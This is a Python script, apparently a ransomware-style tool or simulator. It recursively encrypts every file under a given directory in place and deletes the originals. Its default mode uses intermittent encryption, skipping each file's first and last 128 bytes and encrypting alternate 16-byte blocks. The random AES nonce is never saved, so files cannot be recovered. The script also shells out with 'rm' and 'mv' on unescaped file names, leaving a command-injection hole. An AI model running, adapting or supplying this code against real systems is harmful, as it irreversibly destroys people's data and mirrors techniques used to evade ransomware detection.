#!/usr/local/bin/python3

import base64
import argparse
import logging
import glob
import os
import io
import PIL.Image as Image
import math
import numpy as np
import sys
import time
import itertools
import tqdm

from array import array


from Cryptodome.Cipher import AES
from hashlib import md5

password = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
BLOCK_SIZE = 16

EXTREMITY_SIZE = 128

def pad (data):
    pad = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data

def unpad (padded):
    pad = ord(padded[-1])
    return padded[:-pad]

def encrypt_buffer(data, nonce, password):
    t1 = time.perf_counter()
    key = b'Sixteen byte key'
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    #print(f"Encryption time: {time.perf_counter() - t1} s")
    return ciphertext

def readimage(path):
    with open(path, "rb") as f:
        return bytearray(f.read())

def encrypt_full_file(filename):
    if os.path.isfile(filename):
        encrypted_buffer = encrypt_buffer(readimage(filename), "", password)
        output_filename = f"{filename}.out"
        with open (output_filename, "wb") as f:
            f.write(encrypted_buffer)
            f.close()
        os.system(f"rm {filename}")
        os.system(f"mv {output_filename} {filename}")
        print(f"Encrypted {filename}")
    return {filename: True}


def encrypt_file_alternate_blocks(block_size):
    """
        Do not encrypt the first 128 bytes
        Do not encrypt the last 128 bytes
        For the remaining bytes, encrypt every alternate
        every alternate 16 bytes (or block size bytes)
    """
    def encrypt_fn(filename):
        print(f"Encrypting {filename} : {EXTREMITY_SIZE} {BLOCK_SIZE}")
        if not os.path.exists(filename) or not os.path.isfile(filename):
            return

        plainbuffer = readimage(filename)
        tempbuffer = plainbuffer

        # If the buffer is too small, increase it's size
        while len(tempbuffer) < 1024 + 2 * EXTREMITY_SIZE:
            tempbuffer += plainbuffer
        plainbuffer = tempbuffer

        # Store the tail and head in different buffers
        head_buffer = plainbuffer[:EXTREMITY_SIZE]
        tail_buffer = plainbuffer[-EXTREMITY_SIZE:]

        # Now chop off the tail and the head
        plainbuffer = plainbuffer[EXTREMITY_SIZE:]
        plainbuffer = plainbuffer[:-EXTREMITY_SIZE]

        # The remaininb buffer, chop it into two equal parts
        # with every alternate 16byte chunk going into 
        # either side
        buffer_for_encryption = b''
        buffer_plain_noencrypt = b''
        while len(plainbuffer) > 0:
            buf = plainbuffer[:block_size]
            plainbuffer = plainbuffer[block_size:]
            buffer_for_encryption += buf
            if len(plainbuffer) == 0:
                break
            buf = plainbuffer[:block_size]
            plainbuffer = plainbuffer[block_size:]
            buffer_plain_noencrypt += buf

        # Now encrypt the part we want to encrypt
        buffer_for_encryption = encrypt_buffer(buffer_for_encryption, "", password)

        # Now put the two split bytes back together
        out_buffer = b''
        while len(buffer_for_encryption) > 0 or len(buffer_plain_noencrypt) > 0:
            if len(buffer_for_encryption) > 0:
                out_buffer += buffer_for_encryption[:block_size]
                buffer_for_encryption = buffer_for_encryption[block_size:]
            if len(buffer_plain_noencrypt) > 0:
                out_buffer += buffer_plain_noencrypt[:block_size]
                buffer_plain_noencrypt = buffer_plain_noencrypt[block_size:]
        out_buffer = head_buffer + out_buffer + tail_buffer

        try:
            output_filename = f"{filename}.out"
            with open(output_filename, "wb") as f:
                f.write(out_buffer)
            os.unlink(filename)
            os.rename(output_filename, filename)
        except Exception as e:
            raise e

    return encrypt_fn


PARALLEL_JOBS = 128



#-------------------------------------------------------------------------------


def iterate_files(base_dir):
    """
        Iterate over a directory, and for every file that is not a metadata
        file, call process_single_file.

        Metadata files have the following format:
        __metadata_origfname.origextn.json
    """
    savedir = None

    encryption_fn = encrypt_full_file
    encryption_fn = encrypt_file_alternate_blocks(BLOCK_SIZE)
    try:
        savedir = os.getcwd()
        os.chdir(base_dir)
        filenames = glob.glob("./**", recursive=True)
        for i in tqdm.tqdm(range(0, len(filenames), PARALLEL_JOBS)):
            list(map(encryption_fn, filenames[i: i + PARALLEL_JOBS]))
    except Exception as e:
        logging.error(f"Exception in iteration {e}")
        raise e
    finally:
        if savedir is not None:
            os.chdir(savedir)




#-------------------------------------------------------------------------------



def main():
    parser = argparse.ArgumentParser(\
        description="Iterate files and and encrypt them")
    parser.add_argument("--directory", "-d", type=str, required=True)
    args = parser.parse_args()
    iterate_files(args.directory)



#-------------------------------------------------------------------------------



if "__main__" == __name__:
    main()
